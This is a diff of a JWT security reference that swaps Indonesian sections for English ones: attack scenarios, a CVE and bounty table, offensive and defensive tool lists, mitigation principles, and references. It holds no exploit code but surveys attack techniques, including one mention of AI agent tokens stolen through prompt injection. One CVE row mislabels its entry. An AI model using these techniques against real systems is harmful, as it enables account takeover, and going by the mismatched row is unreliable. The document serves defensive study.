+| **Cross-Account Takeover** | SaaS multi-tenant | §3-2, §3-4, §12-3 | Access competitor tenant's data |
+| **Post-Logout Persistence** | Any | §7-1, §7-2 | Attacker retains access after victim changes password |
+| **Cross-Service Relay** | Microservices | §3-4, §12-1 | Low-priv service token accepted by admin service |
+| **SSRF via Key Reference** | Cloud / API | §2-2, §2-3, §2-4 | AWS metadata access; internal network scan |
+| **Secondary Injection Chain** | Complex backends | §2-4, §9-1 | SQLi / RCE via unsanitized kid / claim |
+| **Private Key Recovery** | ECDSA-signed tokens | §6-1, §6-2, §6-3 | Universal token forgery for all users |
+| **Supply-Chain / IoT** | Device firmware | §5-1, §12-5 | Persistent backdoor surviving firmware update |
+| **Cloud Infrastructure Takeover** | AWS / GCP | §12-2 | Auth bypass across 15,000+ applications |
+| **Social Login Impersonation** | OAuth / OIDC | §12-3 | Account takeover without credentials |
+| **Agentic AI Session Hijack** | M2M / AI pipelines | §11-1, §7-1, §5-2 | AI agent JWT exfiltrated via prompt injection; credentials remain valid indefinitely |
 
 ---
 
-## §8. Pemetaan Skenario Serangan (Sumbu 3)
+## CVE / Bounty Mapping (2023–2026)
 
-| Skenario | Arsitektur / Kondisi | Kategori Mutasi Utama |
-|---|---|---|
-| **Bypass Autentikasi** | Endpoint mana pun yang dilindungi JWT | §1 (manipulasi alg) + §2 (injeksi header) + §3 (kelemahan kripto) |
-| **Eskalasi Hak Istimewa** | Role/izin disimpan dalam claim JWT | §4-2 (claim authz) + bypass signature apa pun (§1–§3) |
-| **Pengambilalihan Akun** | Identitas diturunkan dari claim JWT | §4-1 (identity claim) + §6 (kebocoran/replay token) |
-| **Relay Token Lintas-Layanan** | Microservices / arsitektur multi-API | §4-4 (bypass audience) + §5-1 (kebingungan JWKS) |
-| **Akses Lintas-Tenant** | SaaS / platform cloud multi-tenant | §4-2 (manipulasi tenant ID) + §4-4 (ALBEAST) |
-| **SSRF** | Server mengambil sumber daya jarak jauh dari header JWT | §2-2 (injeksi `jku`) + §2-4 (injeksi `x5u`) |
-| **Remote Code Execution** | Deserialisasi tidak aman atau command injection | §2-1 (command injection `kid`) + §2-5 (deserialisasi `cty`) |
-| **Denial of Service** | Server dengan sumber daya terbatas | §3-2 (kurva tidak valid) + §3-4 (billion hashes PBES2) + §7-3 (kelelahan memori) |
-| **Pemalsuan Token melalui Type Confusion** | Penandatanganan asimetris dengan paparan kunci publik (OIDC) | §7-1 (kebingungan sign/encrypt, token polyglot) |
-| **Bypass WAF/Gateway** | Appliance keamanan di depan aplikasi | §7-2 (trik encoding) + §1-1 (variasi huruf besar/kecil) |
-
----
-
-## §9. Pemetaan CVE / Bounty (2022–2025)
-
-| Kombinasi Mutasi | CVE / Kasus | Dampak / Bounty |
-|---|---|---|
-| §3-2 (Psychic Signatures) | CVE-2022-21449 (Java 15–18) | CVSS 7.5. Bypass signature ECDSA lengkap dengan nilai r,s nol. Mempengaruhi semua library JWT Java yang menggunakan JCA bawaan. |
-| §1-1 (Algoritma None) | CVE-2024-48916 (Ceph RadosGW) | Bypass autentikasi. `alg=none` diterima, memungkinkan pemalsuan claim sembarang. |
-| §4-4 (Bypass audience) | CVE-2024-5798 (HashiCorp Vault) | Bypass autentikasi. Claim audience JWT tidak divalidasi dengan benar; login tidak valid berhasil. |
-| §1-2 (Algorithm confusion) | CVE-2024-54150 | Kebingungan RS256→HS256 yang memungkinkan pemalsuan token dengan kunci publik. |
-| §4-1 (Injeksi array issuer) | CVE-2025-30144 (fast-jwt) | Bypass validasi issuer. Array diterima untuk claim `iss`, mencampurkan issuer yang sah dan berbahaya. |
-| §7-3 (Kelelahan memori) | CVE-2025-27144 (Go JOSE) | DoS. JWT yang cacat dengan titik berlebihan menyebabkan konsumsi memori eksponensial. |
-| §2-3 (Pencocokan Key ID) | CVE-2025-24976 (Distribution registry) | Injeksi kunci. `kid` dicocokkan tetapi materi kunci aktual tidak diverifikasi terhadap store tepercaya. |
-| §7-1 (Kebingungan sign/encrypt) | CVE-2022-39174 (authlib/Python) | Bypass autentikasi. Kunci publik yang digunakan untuk verifikasi JWS dieksploitasi untuk memalsukan token JWE melalui antarmuka decode() terpadu. |
-| §7-1 (Kebingungan sign/encrypt) | CVE-2022-3102 (jwcrypto/Python) | Bypass autentikasi. Vektor kebingungan sign/encrypt yang sama dengan CVE-2022-39174. |
-| §7-1 (Kebingungan sign/encrypt) | CVE-2023-51774 (json-jwt/Ruby) | Bypass pemeriksaan identitas. Gem json-jwt Ruby (< 1.16.6, < 1.15.3.1) rentan terhadap kebingungan sign/encrypt yang memungkinkan pemalsuan claim sembarang. |
-| §3-4 (Billion hashes PBES2) | CVE-2023-51775 (jose4j/Java) | DoS. Parameter `p2c` yang tidak dibatasi memungkinkan kelelahan CPU melalui 2^31 iterasi PBKDF2. Diperbaiki di jose4j 0.9.4. |
-| §3-4 (Billion hashes PBES2) | CVE-2023-49290 (go-jose/Go) | DoS. Eksploitasi `p2c` PBES2 yang sama. Diperbaiki di go-jose v3.0.2. |
-| §1-1 (Algoritma tidak dikenal, signature kosong) | CVE-2026-23993 (HarbourJwt) | Bypass autentikasi. `GetSignature()` mengembalikan string kosong untuk nilai `alg` yang tidak dikenal; perbandingan kosong-vs-kosong lolos verifikasi. |
-| §5-1 / §6-3 (Kebocoran token) | Grafana Bug Bounty | Token JWT dalam parameter query bocor ke sumber data backend melalui permintaan yang di-proxy. |
-| §6-3 (Replay / pencabutan) | HackerOne #3120790 (WakaTime) | Replay sesi. Token yang telah di-logout tetap valid, memungkinkan akses persisten. |
+| Mutation Combination | CVE / Case | Affected | Impact / Bounty |
+|---------------------|-----------|---------|----------------|
+| §1-2 (RS256→HS256) | **CVE-2024-54150** (cjwt library) | Embedded / IoT systems | Auth bypass; CVSS 9.8. Library passed RSA public key to HMAC verify without type check |
+| §1-2 (ECDSA→HS256) | **CVE-2025-27371** | Cloud platform | ECDSA public key recovery enabling token forgery; CVSS Critical |
+| §1-1 + §1-2 | **CVE-2025-4692** | Cloud platform | Algorithm confusion flaw; multiple attack vectors |
+| §1-1 + §4-1 | **CVE-2025-30144** | JWT library | Signature verification skipped; library bypass |
+| §4-4 + §10-1 | **CVE-2026-29000** (pac4j-jwt) | Java applications | JWE-wrapped PlainJWT bypasses signature verification; CVSS **10.0**; unauthenticated remote admin impersonation using only RSA public key |
+| §3-4 + §12-2 | **CVE-2024-8901** (aws-alb-route-directive-adapter) | AWS / Istio | ALBeast: shared ALB infrastructure allows issuer forgery; 15,000+ apps vulnerable |
+| §3-4 + §12-2 | **CVE-2024-10125** (aws-alb-identity-aspnetcore) | AWS / ASP.NET | Missing `signer` and issuer validation; authentication bypass |
+| §3-4 + §12-1 | **HackerOne #1889161** (Argo CD) | Kubernetes CD | aud claim not validated; any OIDC token accepted; Critical severity |
+| §3-2 (email spoofing) | **nOAuth** (Microsoft Azure AD) | All apps using "Sign in with Microsoft" | Email claim mutable by attacker; account takeover; $75,000 total bounty donated |
+| §5-1 (hardcoded key) | **CVE-2025-7079** (bluebell-plus) | Web applications | Hardcoded `"bluebell-plus"` HMAC secret in `jwt.go` |
+| §5-1 (hardcoded key) | **CVE-2025-6950** (Moxa devices) | Industrial IoT / networking gear | Hardcoded JWT signing key in network security devices |
+| §2-4 (kid SQLi) | **CVE-2024-53861** (PyJWT) | Python applications | Issuer claim DoS via malformed array |
+| §6-3 (JWE invalid curve) | **Multiple** (go-jose, node-jose, Nimbus) | Any JWE ECDH-ES user | Private key recovery via invalid elliptic curve point in JWE `epk` field |
+| §9-3 (iss array) | fast-jwt pre-5.0.6 | Node.js applications | Issuer validation bypass via RFC 7519 type violation |
+| §3-3 (Back to Future) | LightSEC 2025 research | IoT supply chain | Pre-signed future-dated tokens survive device lifetime; no CVE assigned yet |
+| §3-2 (email claim) | Real-world SaaS red team (2025) | Multi-tenant SaaS | Cross-subdomain identity injection; full admin takeover |
+| §1-1 (none variant) | **CVE-2015-9235** (jsonwebtoken Node.js) | Node.js applications | Historical: algorithm confusion / none acceptance in widely deployed library |
 
 ---
 
-## §10. Alat Deteksi
+## Detection and Testing Tool Matrix
 
-### Alat Ofensif
-
-| Alat | Cakupan Target | Teknik Utama |
-|---|---|---|
-| **jwt_tool** (Python) | Pengujian JWT yang komprehensif | 16+ modul serangan: none alg, algorithm confusion, injeksi `kid`, pengubahan claim, brute force, injeksi JWKS |
-| **jwtXploiter** | Eksploitasi CVE yang diketahui | Menguji terhadap semua CVE JWT yang diketahui; mengeksploitasi claim header `kid`, `jku`, `x5u` |
-| **JWT Security Analyzer** | Pembuatan payload untuk 20+ vektor serangan | Menghasilkan payload serangan untuk CVE-2024-54150, CVE-2025-30144, CVE-2025-4692, dan lainnya |
-| **hashcat** (`-m 16500`) | Cracking secret HMAC | Serangan brute force / kamus / berbasis aturan secara offline terhadap secret HS256/HS384/HS512 |
-| **jwtfuzz** (Rust) | Fuzzing dan malformasi | Menghasilkan token yang cacat: signature null, algoritma yang ditukar, psychic signatures, kasus tepi encoding |
-| **JWTForge** | Pengujian OAuth2/OIDC | Layanan penjualan JWT yang menghasilkan token yang dapat dikustomisasi untuk fuzzing sistem autentikasi |
-
-### Alat Defensif
-
-| Alat | Cakupan Target | Teknik Utama |
-|---|---|---|
-| **Burp JWT Scanner** (Ekstensi) | Deteksi kerentanan otomatis | Memindai none algorithm, algorithm confusion, secret lemah, injeksi header dalam lalu lintas yang dicegat |
-| **JWTLens** | Analisis dan visualisasi token | Mendekode, menganalisis, dan menyoroti masalah keamanan dalam struktur dan claim JWT |
-| **OWASP WSTG JWT Tests** | Metodologi pengujian penetrasi | Daftar periksa terstruktur yang mencakup semua vektor serangan JWT untuk penilaian keamanan manual |
-
-### Alat Penelitian
-
-| Alat | Cakupan Target | Teknik Utama |
-|---|---|---|
-| **jwt.io** | Inspeksi token | Decoder/encoder online untuk analisis cepat struktur JWT |
-| **PentesterLab JWT Exercises** | Pelatihan dan pengembangan keterampilan | Lab praktis untuk setiap kelas kerentanan JWT termasuk latihan khusus CVE |
-| **hakaioffsec/jwt-vulnerabilities-lab** | Lingkungan praktik | Lab rentan berbasis Docker yang mengimplementasikan jenis kerentanan JWT utama |
+| Tool | Type | Scope | Core Technique |
+|------|------|-------|---------------|
+| **jwt_tool** (ticarpi) | Offensive CLI | Full JWT surface | Token decoding, none attack, algorithm confusion, key injection, claim tampering, hashcat integration |
+| **Burp Suite JWT Editor** | Offensive Burp extension | Full JWT surface | Visual decode/re-sign, embedded JWK attack, jku/x5u collaborator payloads, HMAC key confusion, kid manipulation |
+| **JOSEPH** (Burp) | Offensive Burp extension | Algorithm confusion | RS256→HS256 automated re-sign |
+| **Hashcat** (`-m 16500`) | Offensive cracker | Weak HMAC secrets | GPU-accelerated HS256/384/512 secret brute-force |
+| **rsa_sign2n** / **sig2n** | Offensive utility | Public key recovery | Derives RSA/EC public key from token pairs for algorithm confusion preparation |
+| **jwt.io** | Diagnostic web | Decode / inspect | Base64URL decode and signature verification; key debugger |
+| **Burp Scanner** (JWT checks) | Defensive scanner | Automated detection | Detects none algorithm, missing verification, weak secrets since Burp 2022.5.1 |
+| **OWASP ZAP JWT addon** | Defensive scanner | None, weak signing | Automated JWT vulnerability detection in web application scans |
+| **PyJWT / Nimbus** (hardened) | Defensive library | Implementation | Algorithm allowlisting, mandatory claim validation, key type enforcement |
+| **oidc-client-ts** | Defensive library | OIDC token handling | Automatic nonce validation, state binding, audience validation |
+| **APIsec** | Defensive CI/CD | API-wide JWT | Continuous automated JWT testing integrated into CI/CD pipelines |
+| **Traceable.ai** | Defensive WAF/RASP | Runtime | Detects cross-service relay, abnormal claim patterns, token replay anomalies |
+| **tintinweb/ecdsa-private-key-recovery** | Research utility | ECDSA nonce reuse | Recovers EC private key from two signatures sharing the same `r` value |
+| **jwt_forgery.py** (silentsignal) | Research utility | RSA key derivation | Computes RSA public modulus candidates from token pairs |
 
 ---
 
-## §10-1. Paparan JWT BaaS (Backend-as-a-Service)
+## Summary: Core Principles
 
-Platform Backend-as-a-Service (Supabase, Firebase, Appwrite) mengekspos akses database melalui token JWT sisi klien. Tidak seperti arsitektur tradisional di mana kode sisi server menegakkan kontrol akses, platform BaaS menggeser batas keamanan ke kebijakan tingkat database — Row Level Security (RLS) di Supabase/PostgreSQL, Security Rules di Firebase. Ketika kebijakan ini salah dikonfigurasi atau tidak ada, JWT yang tertanam secara publik memberikan akses tanpa batas.
+**What fundamental property makes this mutation space possible?** The JWT specification is deliberately flexible: it delegates algorithm selection, key identification, and claim semantics to the application layer. The `alg` header is attacker-controlled before verification occurs; key-selection parameters (`kid`, `jku`, `jwk`, `x5u`) are optional, standardized, and frequently accepted without whitelisting; and claim validation is entirely the application's responsibility with no mandatory fields beyond the signature. This means the protocol hands the attacker meaningful control over how the server verifies the very token the attacker is presenting. Every category in this taxonomy ultimately exploits one or more of these delegated decisions.
 
-| Subtipe | Mekanisme | Kondisi Utama |
-|---|---|---|
-| **Row Level Security (RLS) yang hilang** | Platform BaaS menyematkan JWT "anon" dalam JavaScript sisi klien (sengaja publik). Keamanan sepenuhnya bergantung pada kebijakan RLS per-tabel. Ketika RLS tidak diaktifkan atau kebijakan tidak dikonfigurasi pada satu atau lebih tabel, JWT anon memberikan akses baca/tulis tanpa batas ke tabel-tabel tersebut — termasuk token autentikasi, token reset kata sandi, PII, dan kredensial | BaaS berbasis Supabase/PostgreSQL; satu atau lebih tabel tanpa `ALTER TABLE ... ENABLE ROW LEVEL SECURITY` atau tanpa kebijakan yang didefinisikan |
-| **Paparan Service Role Key** | JWT `service_role` (yang melewati semua RLS) yang bocor melalui kode sisi klien, file `.env` dalam repositori publik, pesan error, atau artefak build memberikan akses database admin penuh yang setara dengan akses superuser PostgreSQL langsung | Service role key dapat diakses penyerang; tidak ada batasan tingkat jaringan pada akses API Supabase langsung |
-| **Miskonfigurasi Firebase Security Rules** | Firebase Realtime Database dan Firestore secara default menolak semua, tetapi developer biasanya menetapkan aturan yang terlalu permisif selama pengembangan (`".read": true, ".write": true`) dan gagal membatasinya sebelum produksi. Pengguna mana pun yang terautentikasi (atau anonim) dapat membaca/menulis seluruh database | Proyek Firebase dengan aturan keamanan yang permisif; autentikasi anonim diaktifkan |
+**Why do incremental patches fail to eliminate the threat?** Each vulnerability class is independently rooted in a specification design choice rather than an implementation bug. Fixing algorithm confusion does not fix weak secrets; fixing key injection does not fix claim bypass; fixing signature verification does not fix post-logout replay. The spec's explicit mandates (e.g., only HS256 and `none` are required to implement) create a floor of fragility, while its optional features create an upper ceiling of attack surface. Libraries patch individual CVEs while the structural permissiveness remains. New deployment contexts — microservices, cloud load balancers, agentic AI — continuously introduce new interpretive gaps between the spec and reality.
+
+**What would a structural solution look like?** A robust baseline requires constraining the spec at the library layer: algorithm allowlisting (reject any `alg` not explicitly configured), key type enforcement (reject a symmetric key where asymmetric is expected), mandatory claim validation (reject tokens missing `exp`, `aud`, `iss`), and explicit key-selection from a server-side registry with no attacker-supplied override. For revocation, the architecture must accept that stateless JWTs are unsuitable for high-assurance sessions: short lifetimes (under 15 minutes) combined with server-side refresh token state provide revocability without sacrificing scalability. RFC 8725 (JWT Best Current Practices) codifies these recommendations, but enforcement requires library-level defaults, not developer discipline.
 
 ---
 
-## §11. Ringkasan: Prinsip-Prinsip Inti
+## References
 
-**Properti fundamental yang membuat permukaan serangan JWT begitu luas adalah sifat ganda token sebagai pembawa data sekaligus rangkaian instruksi untuk verifikasinya sendiri.** Header JWT dikontrol penyerang namun mendikte keputusan keamanan yang kritis — algoritma mana yang digunakan, di mana menemukan kunci verifikasi, cara menginterpretasikan payload. Pembalikan kontrol ini (pesan yang menginstruksikan verifier cara memverifikasinya) adalah penyebab akar dari seluruh keluarga serangan §1 (manipulasi algoritma) dan §2 (injeksi parameter header). Tidak ada mekanisme autentikasi umum lain yang memberikan klien tingkat pengaruh ini atas proses verifikasi.
-
-**Perbaikan inkremental gagal karena permukaan serangan bersifat kombinatorial.** Memperbaiki `alg: none` tidak mencegah algorithm confusion. Memperbaiki algorithm confusion tidak mencegah injeksi `kid`. Memperbaiki injeksi `kid` tidak mencegah SSRF `jku`. Setiap target mutasi (§1–§7) dapat dieksploitasi secara independen, dan kombinasi menciptakan rantai serangan baru (misalnya bypass `jku` + algorithm confusion + manipulasi claim). Library harus mengimplementasikan postur "tolak-secara-default" di seluruh *semua* parameter header secara bersamaan, yang banyak gagal dilakukan — terbukti dari CVE yang berulang di berbagai library dari tahun ke tahun (2015 hingga 2025).
-
-**Solusi struktural memerlukan empat prinsip arsitektur:** (1) **Pinning algoritma sisi server** — jangan pernah membaca algoritma dari token; konfigurasikan di tingkat aplikasi. (2) **Resolusi kunci tertutup** — jangan pernah mengambil, menyematkan, atau me-resolve kunci secara dinamis dari header token; gunakan key store yang telah dikonfigurasi sebelumnya dan tidak dapat diubah. (3) **Penegakan jenis token eksplisit** — selalu terapkan apakah JWS atau JWE yang diharapkan; jangan pernah menggunakan antarmuka `decode()` terpadu yang mendeteksi jenis token secara otomatis. Serangan kebingungan sign/encrypt dan token polyglot (§7-1) menunjukkan bahwa menggabungkan penandatanganan dan enkripsi ke dalam satu jalur kode mengubah pemeriksaan bukti-keaslian menjadi pemeriksaan dekripsi semata, yang bisa dilewati siapa pun dengan kunci publik. (4) **Manajemen lifecycle stateful** — terima bahwa JWT yang sepenuhnya stateless tidak dapat mendukung pencabutan, pencegahan replay, atau pengikatan sesi; perkuat dengan status sisi server (daftar hitam token, rotasi refresh token, pelacakan `jti`) untuk kasus penggunaan mana pun yang memerlukan properti ini. DoS billion hashes PBES2 (§3-4) menegaskan bahwa bahkan spesifikasi RFC itu sendiri memiliki celah tingkat protokol — parameter komputasi yang tidak dibatasi — yang tidak dapat diperbaiki oleh library mana pun tanpa menyimpang dari standar.
+1. RFC 7515 — JSON Web Signature (JWS). IETF, 2015.
+2. RFC 7516 — JSON Web Encryption (JWE). IETF, 2015.
+3. RFC 7517 — JSON Web Key (JWK). IETF, 2015.
+4. RFC 7518 — JSON Web Algorithms (JWA). IETF, 2015.
+5. RFC 7519 — JSON Web Token (JWT). IETF, 2015.
+6. RFC 8725 — JSON Web Token Best Current Practices. IETF, 2020.
+7. McLean, T. "Critical Vulnerabilities in JSON Web Token Libraries." Auth0 Blog, 2015.
+8. Sanso, A. "Critical Vulnerability Uncovered in JSON Web Encryption." Adobe Security Blog, 2017.
+9. PortSwigger Web Security Academy — JWT Attacks. https://portswigger.net/web-security/jwt
+10. PortSwigger Web Security Academy — Algorithm Confusion Attacks. https://portswigger.net/web-security/jwt/algorithm-confusion
+11. PentesterLab. "The Ultimate Guide to JWT Vulnerabilities and Attacks." May 2025.
+12. PentesterLab. "Another JWT Algorithm Confusion Vulnerability: CVE-2024-54150." December 2024.
+13. Miggo Research. "ALBeast: A Simple Misconfiguration to a Complete Authentication Bypass." August 2024.
+14. CVE-2024-8901 — aws-alb-route-directive-adapter-for-istio missing JWT issuer and signer validation. AWS Security Bulletin AWS-2024-011.
+15. CVE-2024-10125 — aws-alb-identity-aspnetcore missing JWT issuer and signer validation. AWS Security Bulletin AWS-2024-012.
+16. CVE-2026-29000 — pac4j-jwt JwtAuthenticator Authentication Bypass via JWE-Wrapped PlainJWT. CodeAnt AI Security Research, March 2026. CVSS 10.0.
+17. Descope. "nOAuth: How Microsoft OAuth Misconfiguration Can Lead to Full Account Takeover." June 2023.
+18. HackerOne Report #1889161 — Argo CD JWT audience claim not verified. Critical severity.
+19. SecurityPattern. "Exposing a Critical, Systemic Flaw in JWT: The Back to the Future Attack." LightSEC 2025, Istanbul. September 2025.
+20. CVE-2025-7079 — Hardcoded JWT key in bluebell-plus. 2025.
+21. CVE-2025-6950 — Hardcoded JWT signing key in Moxa network devices. 2025.
+22. fast-jwt pre-5.0.6 — iss array claim type confusion bypass. 2025.
+23. Trail of Bits. "ECDSA: Handle with Care." June 2020. https://blog.trailofbits.com/2020/06/11/ecdsa-handle-with-care/
+24. HackTricks. "JWT Vulnerabilities (Json Web Tokens)." https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens
+25. OWASP WSTG — Testing JSON Web Tokens. https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens
+26. Traceable.ai. "JWTs Under the Microscope: How Attackers Exploit Authentication and Authorization Weaknesses." 2024.
+27. AhnLab ASEC. "The Shadow of JWT-Based Authentication: A Fatal Threat Behind the Convenience." December 2025.
+28. Deep Strike. "From Email Reuse to Full Admin Takeover: A Real JWT Exploit." January 2025.
 
 ---
 
-*Dokumen ini dibuat untuk tujuan penelitian keamanan defensif dan pemahaman kerentanan.*
-
----
-
-## Referensi
-
-- RFC 7519: JSON Web Token (JWT) — https://datatracker.ietf.org/doc/html/rfc7519
-- RFC 7518: JSON Web Algorithms (JWA) — https://datatracker.ietf.org/doc/html/rfc7518
-- PortSwigger Web Security Academy: JWT Attacks — https://portswigger.net/web-security/jwt
-- Auth0: Critical Vulnerabilities in JSON Web Token Libraries — https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/
-- PentesterLab: The Ultimate Guide to JWT Vulnerabilities and Attacks — https://pentesterlab.com/blog/jwt-vulnerabilities-attacks-guide
-- HackTricks: JWT Vulnerabilities — https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens
-- OWASP WSTG: Testing JSON Web Tokens — https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens
-- Red Sentry: JWT Vulnerabilities List 2026 — https://redsentry.com/resources/blog/jwt-vulnerabilities-list-2026-security-risks-mitigation-guide
-- TrustedSec: Keys to JWT Assessments — https://trustedsec.com/blog/keys-to-jwt-assessments-from-a-cheat-sheet-to-a-deep-dive
-- Wallarm: 340 Weak JWT Secrets — https://lab.wallarm.com/340-weak-jwt-secrets-you-should-check-in-your-code/
-- Intigriti: Exploiting JWT Vulnerabilities — https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-jwt-vulnerabilities
-- Akamai: Analyzing Broken User Authentication Threats to JWT — https://www.akamai.com/blog/security-research/owasp-authentication-threats-for-json-web-token
-- PentesterLab: CVE-2026-23993 HarbourJwt Unknown Algorithm JWT Bypass — https://pentesterlab.com/blog/cve-2026-23993-harbourjwt-unknown-alg-jwt-bypass
-- JFrog: CVE-2022-21449 "Psychic Signatures" Analysis — https://jfrog.com/blog/cve-2022-21449-psychic-signatures-analyzing-the-new-java-crypto-vulnerability/
-- Traceable AI: JWTs Under the Microscope — https://www.traceable.ai/blog-post/jwts-under-the-microscope-how-attackers-exploit-authentication-and-authorization-weaknesses
-- Tom Tervoort (Secura): Three New Attacks Against JSON Web Tokens (BlackHat US 2023) — https://i.blackhat.com/BH-US-23/Presentations/US-23-Tervoort-Three-New-Attacks-Against-JSON-Web-Tokens.pdf
-- Trail of Bits: Out of the kernel, into the tokens — https://blog.trailofbits.com/2024/03/08/out-of-the-kernel-into-the-tokens/
+*This document was created for defensive security research and vulnerability understanding purposes.*
